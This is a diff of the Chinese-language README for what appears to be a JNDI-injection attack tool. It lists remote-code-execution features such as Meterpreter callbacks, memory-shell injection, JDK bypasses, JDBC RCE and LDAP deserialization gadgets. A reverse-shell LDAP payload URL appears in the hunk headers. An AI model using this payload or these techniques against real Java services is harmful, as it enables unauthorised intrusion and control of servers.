@@ -40,29 +40,12 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - Meterpreter 上线
 - 加载自定义 Java 字节码
 - 内存马注入 (基于 [MemShellParty](https://github.com/ReaJason/MemShellParty))
+- 高版本 JDK 绕过
+  - BeanFactory 绕过 (Tomcat/Groovy/XStream, etc.)
+  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
+  - Tomcat Blind XXE
+- LDAP 反序列化 (包含常用 Gadget)
 - Nashorn JS 自定义 Payload
-- BeanFactory 绕过
-  - Tomcat
-  - Groovy
-  - XStream
-  - SnakeYaml
-  - BeanShell
-  - MVEL
-  - MLet
-  - NativeLibLoader
-- JDBC RCE (MySQL/PostgreSQL/H2/Derby)
-  - Commons DBCP
-  - Tomcat DBCP
-  - Tomcat JDBC
-  - Alibaba Druid
-  - HikariCP
-- LDAP 反序列化:
-  - CommonsCollections K1-K4
-  - CommonsBeanutils183
-  - CommonsBeanutils194
-  - Jackson
-  - Fastjson1
-  - Fastjson2
 
 ## 📖 使用指南
 
@@ -90,6 +73,7 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - [Apache Derby](USAGE.md#derby)
     - [Derby SQL RCE](USAGE.md#derby-sql-rce)
     - [Derby 主从复制反序列化 RCE](USAGE.md#derby-主从复制反序列化-rce)
+- [Tomcat Blind XXE](USAGE.md#tomcat-blind-xxe)
 - [LDAP Deserialization](USAGE.md#ldap-deserialization)
 - [Script](USAGE.md#script)
 - [useReferenceOnly](USAGE.md#usereferenceonly)
